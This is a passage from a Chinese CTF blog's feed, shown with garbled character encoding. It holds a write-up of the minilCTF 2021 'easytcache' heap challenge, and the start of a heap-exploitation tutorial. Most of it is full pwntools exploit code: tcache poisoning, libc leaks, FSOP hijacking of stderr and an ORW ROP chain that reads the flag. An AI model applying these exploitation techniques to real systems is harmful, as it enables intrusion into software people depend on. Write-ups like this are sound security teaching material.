class="string">b&#x27;\x00&#x27;</span>) + p64(<span class="number">0</span>) * <span class="number">15</span> + p64(__environ - <span class="number">0x168</span>)) <span class="comment"># local is 0x140, something may be wrong?</span></span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx 4, fake chunk on the stack</span></span><br><span class="line">    </span><br><span class="line">    edit(<span class="number">4</span>, orw)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;/flag\x00&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Done!\n&quot;</span>)</span><br><span class="line">    log.success(<span class="string">&quot;flag received: &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(p.recvuntil(<span class="string">b&#x27;&#125;&#x27;</span>).decode())</span><br><span class="line">    p.recv()</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="è§£æ³•äºŒï¼šé€šè¿‡-exit-è¿›è¡ŒFSOPæ„é€ ROPè¿›è¡ŒORW"><a href="#è§£æ³•äºŒï¼šé€šè¿‡-exit-è¿›è¡ŒFSOPæ„é€ ROPè¿›è¡ŒORW" class="headerlink" title="è§£æ³•äºŒï¼šé€šè¿‡ exit() è¿›è¡ŒFSOPæ„é€ ROPè¿›è¡ŒORW"></a>è§£æ³•äºŒï¼šé€šè¿‡ exit() è¿›è¡ŒFSOPæ„é€ ROPè¿›è¡ŒORW</h3><p>è€ƒè™‘åˆ°<code>exit()</code>å‡½æ•°ä¼šè°ƒç”¨<code> _IO_flush_all_lockp ()</code>å‡½æ•°ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¾¿å¯ä»¥åŠ«æŒ<code>_IO_2_1_stderr_</code>è¿›è¡ŒFSOPï¼Œæ§åˆ¶ç¨‹åºæ‰§è¡Œæµç¨‹</p><p>ç”±äºvtableè¡¨åˆæ³•æ€§æ£€æµ‹çš„å­˜åœ¨ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æŠŠæœ€åä¸€æ¬¡mallocçš„æœºä¼šç”¨æ‰ï¼Œä»¥åŠ«æŒvtableè¡¨</p><p>ç¬”è€…æµ‹è¯•åœ¨è¿™é‡Œå¦‚æœé€‰æ‹©ç›´æ¥æ”¹<code>_IO_file_jumps</code>è¡¨ä¸­çš„<code>__overflow</code>ä¼šè§¦å‘SIGSEGVï¼Œå› æ­¤è€ƒè™‘åŠ«æŒä¸€ä¸ªåˆæ³•çš„vtableè¡¨ä½ï¼ŒåŒæ—¶å°†stderrçš„vtableè¡¨åŠ«æŒä¸ºè¯¥ä½ç½®ï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥é€šè¿‡<code>__overflow</code>æ§åˆ¶ç¨‹åºæ‰§è¡Œæµ</p><blockquote><p>æ³¨ï¼šå…¶å®åªéœ€è¦vtableè¡¨ä½ç½®åˆæ³•å³å¯</p></blockquote><p>åŒæ—¶æˆ‘ä»¬è¿˜éœ€è¦è¿›è¡Œä¸€æ¬¡æ ˆè¿ç§»ï¼Œæ•…è€ƒè™‘é€šè¿‡setcontext + 61ä¸Šçš„gadgetè¿›è¡ŒSROPï¼Œé‚£ä¹ˆæˆ‘ä»¬æœ€åˆçš„è·³è½¬ä½ç½®å¯ä»¥è·³åˆ°è¿™é‡Œï¼š</p><p><img src="https://i.loli.net/2021/05/06/Ws1dxZrRBTpJz72.png"></p><p>æˆ‘ä»¬è¿˜éœ€è¦æ„é€ <code>ucontext_t</code>ç»“æ„ä½“ ï¼Œå¯ä»¥ä½¿ç”¨å‰é¢çš„é‚£ä¸ªé¢„ç•™çš„ç´§æŒ¨ç€top chunkçš„chunkï¼Œä½¿ç”¨pwntoolsä¸­çš„<code>SigreturnFrame()</code>å¯ä»¥å¿«é€Ÿæ„é€ è¯¥ç»“æ„ä½“ï¼ŒåŒæ—¶stderr + 8çš„ä½ç½®éœ€è¦æŒ‡å‘è¯¥å †å—</p><p>æœ€åçš„expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process([<span class="string">&#x27;./ld-2.33.so&#x27;</span>, <span class="string">&#x27;./easytcache&#x27;</span>], env=&#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>:<span class="string">&#x27;./libc.so.6&#x27;</span>&#125;)<span class="comment">#p = remote(&#x27;sec.arttnba3.cn&#x27;, 10004)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./easytcache&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">one_gadget = <span class="number">0xe6e73</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Your choice: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;size?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;index?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;content?&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;index?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;content: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;index?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="comment"># tcache double free</span></span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx0</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak the heap base</span></span><br><span class="line">    log.info(<span class="string">&quot;start leaking the heap base addr...&quot;</span>)</span><br><span class="line">    edit(<span class="number">0</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    dump(<span class="number">0</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    heap_leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">    heap_base = heap_leak - <span class="number">0x10</span></span><br><span class="line">    log.success(<span class="string">&#x27;heap base leak: &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(heap_base)))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># tcache poisoning, hijack the tcache struct</span></span><br><span class="line">    edit(<span class="number">0</span>, <span class="string">b&#x27;arttnba3&#x27;</span> * <span class="number">2</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">0</span>, p64((heap_base + <span class="number">0x10</span>) ^ ((heap_base + <span class="number">0x290</span> + <span class="number">0x11c10</span> + <span class="number">0x10</span>) &gt;&gt; <span class="number">12</span>)))</span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx1</span></span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx2, our fake chunk based on tcache manager</span></span><br><span class="line">    edit(<span class="number">2</span>, <span class="string">b&#x27;\x00\x00&#x27;</span> * <span class="number">39</span> + <span class="string">b&#x27;\x07\x00&#x27;</span>) <span class="comment"># set it full</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak the libc base</span></span><br><span class="line">    log.info(<span class="string">&quot;start leaking the libc base addr...&quot;</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">2</span>, <span class="string">b&#x27;\x0a&#x27;</span>)</span><br><span class="line">    dump(<span class="number">2</span>)</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">96</span> - <span class="number">0xa</span></span><br><span class="line">    __malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = __malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;libc base leak: &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct the fake frame for setcontext</span></span><br><span class="line">    log.info(<span class="string">&quot;start constructing the fake sigreturn frame on chunk 1...&quot;</span>)</span><br><span class="line">    fake_frame_addr = heap_base + <span class="number">0x290</span> + <span class="number">0x11c10</span> + <span class="number">0x10</span></span><br><span class="line">    fake_frame = SigreturnFrame()</span><br><span class="line">    fake_frame[<span class="string">&#x27;uc_stack.ss_size&#x27;</span>] = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">61</span></span><br><span class="line">    fake_frame.rdi = <span class="number">0</span></span><br><span class="line">    fake_frame.rsi = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    fake_frame.rdx = <span class="number">0x200</span></span><br><span class="line">    fake_frame.rsp = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    fake_frame.rip = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">    edit(<span class="number">1</span>, <span class="built_in">bytes</span>(fake_frame) + <span class="string">b&quot;/flag\x00&quot;</span>)</span><br><span class="line">    log.success(<span class="string">&quot;construction complete&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct the orw rop chain</span></span><br><span class="line">    log.info(<span class="string">&quot;start constructing the orw rop chain...&quot;</span>)</span><br><span class="line">    flag_addr = fake_frame_addr + <span class="built_in">len</span>(<span class="built_in">bytes</span>(fake_frame))</span><br><span class="line">    pop_rdi_ret = libc_base + libc.search(asm(<span class="string">&quot;pop rdi ; ret&quot;</span>)).__next__()</span><br><span class="line">    pop_rsi_ret = libc_base + libc.search(asm(<span class="string">&quot;pop rsi ; ret&quot;</span>)).__next__()</span><br><span class="line">    pop_rdx_ret = libc_base + libc.search(asm(<span class="string">&quot;pop rdx ; ret&quot;</span>)).__next__()</span><br><span class="line">    pop_rdx_pop_rbx_ret = libc_base + libc.search(asm(<span class="string">&#x27;pop rdx ; pop rbx ; ret&#x27;</span>)).__next__()</span><br><span class="line"></span><br><span class="line">    orw = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    orw += p64(pop_rdi_ret) + p64(flag_addr) + p64(pop_rsi_ret) + p64(<span class="number">4</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line">    orw += p64(pop_rdi_ret) + p64(<span class="number">3</span>) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_pop_rbx_ret) + p64(<span class="number">0x40</span>) + p64(<span class="number">0</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">    orw += p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_pop_rbx_ret) + p64(<span class="number">0x40</span>) + p64(<span class="number">0</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line">    log.success(<span class="string">&quot;construction complete&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#construct the fake IO_FILE</span></span><br><span class="line">    log.info(<span class="string">&quot;start constructing the fake stderr structure...&quot;</span>)</span><br><span class="line">    fake_file = <span class="string">b&quot;&quot;</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>) <span class="comment"># _flags, an magic number</span></span><br><span class="line">    fake_file += p64(fake_frame_addr) <span class="comment"># _IO_read_ptr</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>) <span class="comment"># _IO_read_end</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>) <span class="comment"># _IO_read_base</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>) <span class="comment"># _IO_write_base</span></span><br><span class="line">    fake_file += <span class="string">b&quot;arttnba3&quot;</span> <span class="comment"># _IO_write_ptr</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>) <span class="comment"># _IO_write_end</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>) <span class="comment"># _IO_buf_base;</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>) <span class="comment"># _IO_buf_end should usually be (_IO_buf_base + 1)</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>) * <span class="number">4</span> <span class="comment"># from _IO_save_base to _markers</span></span><br><span class="line">    fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]) <span class="comment"># the FILE chain ptr</span></span><br><span class="line">    fake_file += p32(<span class="number">2</span>) <span class="comment"># _fileno for stderr is 2</span></span><br><span class="line">    fake_file += p32(<span class="number">0</span>) <span class="comment"># _flags2, usually 0</span></span><br><span class="line">    fake_file += p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>) <span class="comment"># _old_offset, -1</span></span><br><span class="line">    fake_file += p16(<span class="number">0</span>) <span class="comment"># _cur_column</span></span><br><span class="line">    fake_file += <span class="string">b&quot;\x00&quot;</span> <span class="comment"># _vtable_offset</span></span><br><span class="line">    fake_file += <span class="string">b&quot;\n&quot;</span> <span class="comment"># _shortbuf[1]</span></span><br><span class="line">    fake_file += p32(<span class="number">0</span>) <span class="comment"># padding</span></span><br><span class="line">    fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>] + <span class="number">0x1ef0</span>) <span class="comment"># _IO_stdfile_2_lock</span></span><br><span class="line">    fake_file += p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>) <span class="comment"># _offset, -1</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>) <span class="comment"># _codecvt, usually 0</span></span><br><span class="line">    fake_file += p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>] - <span class="number">0xe40</span>) <span class="comment"># _IO_wide_data_2</span></span><br><span class="line">    fake_file += p64(<span class="number">0</span>) * <span class="number">3</span> <span class="comment"># from _freeres_list to __pad5</span></span><br><span class="line">    fake_file += p32(<span class="number">0xFFFFFFFF</span>) <span class="comment"># _mode, usually -1</span></span><br><span class="line">    fake_file += <span class="string">b&quot;\x00&quot;</span> * <span class="number">19</span> <span class="comment"># _unused2</span></span><br><span class="line">    fake_file = fake_file.ljust(<span class="number">0xD8</span>,<span class="string">b&#x27;\x00&#x27;</span>) <span class="comment"># adjust to vtable</span></span><br><span class="line">    fake_file += p64(libc_base + <span class="number">0x1e2550</span>) <span class="comment"># unable to hijack to _IO_file_jumps directly, so we choose a location nearby</span></span><br><span class="line">    log.success(<span class="string">&quot;construction complete&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># tcache poisoning</span></span><br><span class="line">    log.info(<span class="string">&quot;start tcache poisoning...&quot;</span>)</span><br><span class="line">    edit(<span class="number">2</span>, <span class="string">b&quot;\x07\x00&quot;</span> * <span class="number">64</span> + p64(<span class="number">0</span>) * <span class="number">15</span> + p64(libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]))</span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx 4, our fake chunk based on _IO_2_1_stderr_</span></span><br><span class="line">    edit(<span class="number">3</span>, fake_file)</span><br><span class="line">    edit(<span class="number">2</span>, <span class="string">b&quot;\x07\x00&quot;</span> * <span class="number">64</span> + p64(<span class="number">0</span>) * <span class="number">15</span> + p64(libc_base + <span class="number">0x1e2550</span> + <span class="number">0x10</span>))</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    new(<span class="number">0x100</span>) <span class="comment"># idx 5, our fake chunk base on fake __overflow</span></span><br><span class="line">    edit(<span class="number">4</span>, p64(libc_base + <span class="number">0x14A0A0</span>) * <span class="number">2</span>)</span><br><span class="line">    log.success(<span class="string">&quot;tcache poisoning complete&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get the flag</span></span><br><span class="line">    log.info(<span class="string">&quot;start sending the orw rop chain...&quot;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    p.sendline(orw)</span><br><span class="line">    log.success(<span class="string">&quot;orw rop chain has been sent&quot;</span>)</span><br><span class="line">    log.info(<span class="string">&quot;start getting the flag...&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;THERE&#x27;S NO DOUBT THAT YOU ARE THINKING ABOUT PEACH!\n&quot;</span>)</span><br><span class="line">    log.success(<span class="string">&quot;flag received: &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(p.recvuntil(<span class="string">b&#x27;&#125;&#x27;</span>).decode())</span><br><span class="line">    p.recv()</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="éé¢„æœŸï¼š"><a href="#éé¢„æœŸï¼š" class="headerlink" title="éé¢„æœŸï¼š"></a>éé¢„æœŸï¼š</h3><p>å½±äºŒã¤å¸ˆå‚…ï¼Œ æœ¬åœºæ¯”èµ›ä¸­å”¯ä¸€çš„è§£ï¼š</p><p><img src="https://i.loli.net/2021/05/15/9GLfiSZnR6e4Xvp.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/05/15/LQfOiMuyn24WktF.png" alt="image.png"></p><p>ç¬”è€…æš‚æ—¶è¿˜æ²¡å¤ç°è¿‡è¿™ä¸ªéé¢„æœŸï¼Œä¸è¿‡ä¸å¾—ä¸è¯´è¿™ç¡®å®æ˜¯ä¸€ä¸ªä¸é”™çš„æ€è·¯</p><h3 id="éé¢„æœŸäºŒï¼š"><a href="#éé¢„æœŸäºŒï¼š" class="headerlink" title="éé¢„æœŸäºŒï¼š"></a>éé¢„æœŸäºŒï¼š</h3><p><a href="https://www.anquanke.com/post/id/235598#h3-4">House of Kiwi</a>ï¼Œç”±fmyyå¸ˆå‚…æä¾›çš„èµ°FSOPè§£æ³•</p><p><img src="https://p3.ssl.qhimg.com/t016933e48a0f026951.jpg" alt="image.png"></p><p>ä»¥ä¸Šä¸¤ç§éé¢„æœŸè§£æ³•éƒ½åªéœ€è¦ä½¿ç”¨ä¸€æ¬¡ä»»æ„åœ°å€å†™ï¼ˆ<del>æ‡‚äº†ï¼Œæ˜å¹´æŠŠmallocæ¬¡æ•°å‡å°‘ä¸€æ¬¡</del>ï¼‰</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;0x00-ç»ªè®º&quot;&gt;&lt;a href=&quot;#0x00-ç»ªè®º&quot; class=&quot;headerlink&quot; title=&quot;0x00.ç»ªè®º&quot;&gt;&lt;/a&gt;0x00.ç»ªè®º&lt;/h1&gt;&lt;p&gt;å¾ˆé«˜å…´èƒ½å’ŒRXå¤§å“¥å’Œåä¼šçš„å…¶ä»–å¸ˆå‚…ä¸€èµ·å‡ºäº†è¿™ä¸€æ¬¡ minilCTF 2021 çš„é¢˜ï¼Œè™½ç„¶è¯´åªå‡ºäº†ä¸¤é“æ¯”è¾ƒç®€å•çš„é¢˜233333ï¼Œä¸è¿‡è¿˜æ˜¯å¸Œæœ›å¤§å®¶èƒ½å¤Ÿå–œæ¬¢ï¼ˆï¼‰&lt;/p&gt;
&lt;p&gt;ç‚¹å¼€ä¸‹æ–¹æŸ¥çœ‹é¢˜è§£ğŸ‘‡&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://archive.next.arttnba3.cn/categories/CTF/"/>
    
    
    <category term="python" scheme="http://archive.next.arttnba3.cn/tags/python/"/>
    
    <category term="ä¿¡æ¯å®‰å…¨" scheme="http://archive.next.arttnba3.cn/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="PWN" scheme="http://archive.next.arttnba3.cn/tags/PWN/"/>
    
    <category term="CTF" scheme="http://archive.next.arttnba3.cn/tags/CTF/"/>
    
    <category term="å †" scheme="http://archive.next.arttnba3.cn/tags/%E5%A0%86/"/>
    
    <category term="ROP" scheme="http://archive.next.arttnba3.cn/tags/ROP/"/>
    
    <category term="UAF" scheme="http://archive.next.arttnba3.cn/tags/UAF/"/>
    
    <category term="æ ¼å¼å­—ç¬¦ä¸²" scheme="http://archive.next.arttnba3.cn/tags/%E6%A0%BC%E5%BC%8F%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    
  </entry>
  
  <entry>
    <title>ã€CTFèµ„æ–™-0x0002ã€‘ç®€æ˜“Linuxå †åˆ©ç”¨å…¥é—¨æ•™ç¨‹by arttnba3</title>
    <link href="http://archive.next.arttnba3.cn/2021/02/24/%E3%80%90CTF%E8%B5%84%E6%96%99-0x0002%E3%80%91%E7%AE%80%E6%98%93Linux%E5%A0%86%E5%88%A9%E7%94%A8%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8Bby%20arttnba3/"/>
    <id>http://archive.next.arttnba3.cn/2021/02/24/%E3%80%90CTF%E8%B5%84%E6%96%99-0x0002%E3%80%91%E7%AE%80%E6%98%93Linux%E5%A0%86%E5%88%A9%E7%94%A8%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8Bby%20arttnba3/</id>
    <published>2021-02-23T19:56:56.000Z</published>
    <updated>2021-02-24T05:30:02.722Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CTF-PWN-ç®€æ˜“Linuxå †åˆ©ç”¨å…¥é—¨æ•™ç¨‹by-arttnba3"><a href="#CTF-PWN-ç®€æ˜“Linuxå †åˆ©ç”¨å…¥é—¨æ•™ç¨‹by-arttnba3" class="headerlink" title="CTF-PWN-ç®€æ˜“Linuxå †åˆ©ç”¨å…¥é—¨æ•™ç¨‹by arttnba3"></a>CTF-PWN-ç®€æ˜“Linuxå †åˆ©ç”¨å…¥é—¨æ•™ç¨‹by arttnba3</h1><blockquote><p>ä¸è¦æ»¡è¶³äºåšä¸€ä¸ªptmallocæ‹³å‡»æ‰‹</p></blockquote><span id="more"></span><blockquote><p>å¤§éƒ¨åˆ†å†…å®¹æ¥è‡ªäº<a href="https://arttnba3.cn/2021/01/15/NOTE-0X00-MALLOC-2.23-PART-I/"> glibc2.23mallocæºç åˆ†æ - Iï¼šå †å†…å­˜çš„åŸºæœ¬ç»„ç»‡å½¢å¼ </a></p></blockquote><h2 id="0x00-å†™åœ¨å¼€å§‹ä¹‹å‰"><a href="#0x00-å†™åœ¨å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00.å†™åœ¨å¼€å§‹ä¹‹å‰"></a>0x00.å†™åœ¨å¼€å§‹ä¹‹å‰</h2><p> å¯¹äºå †ç®¡ç†å™¨çš„åˆ©ç”¨ä¸€ç›´ä»¥æ¥éƒ½æ˜¯CTFæ¯”èµ›ä¸­çš„çƒ­ç‚¹ï¼Œ<del>æŒ‰æˆ‘çš„æ„Ÿå—æ¥çœ‹é€šå¸¸æƒ…å†µä¸‹å¤§æ¯”èµ›çš„ç­¾åˆ°é¢˜éƒ½ä¼šæ˜¯ä¸€é“easy heap</del>ï¼ŒåŒæ—¶ç”±äºå…¶çŸ¥è¯†ç‚¹çš„ç¹å¤å†—æ‚ï¼Œå¯¹äºLinuxçš„å †ç®¡ç†å™¨çš„åˆ©ç”¨ä¹Ÿæ˜¯Pwnerä»¬çš„å­¦ä¹ è·¯å¾„ä¸Šçš„ä¸€ä¸ªç“¶é¢ˆï¼Œå› æ­¤æœ¬äººå†³å®šæ’°å†™è¯¥æ•™ç¨‹ï¼Œå¸Œæœ›èƒ½å¤Ÿå¸®åŠ©æ›´å¤šåˆå…¥pwnä¸–ç•Œçš„èŒæ–°ä»¬å°½å¿«æŒæ¡å¯¹äºå †ç®¡ç†å™¨çš„ç¾å¦™åˆ©ç”¨</p><p>å½“ç„¶ï¼Œæœ¬æ•™ç¨‹å¹¶ä¸ä¸“ä¸šï¼Œç¬”è€…æ›´åŠ æ¨èæƒ³è¦æ·±å…¥äº†è§£CTFä¸­ptmallocå †åˆ©ç”¨çš„åŒå­¦å‰å¾€CTF wiki</p><p>æœ¬æ•™ç¨‹ä»…ä¸ºå…¥é—¨çº§åˆ«çš„æ•™ç¨‹ï¼Œä»…é€‚ç”¨äºåˆè¯†å 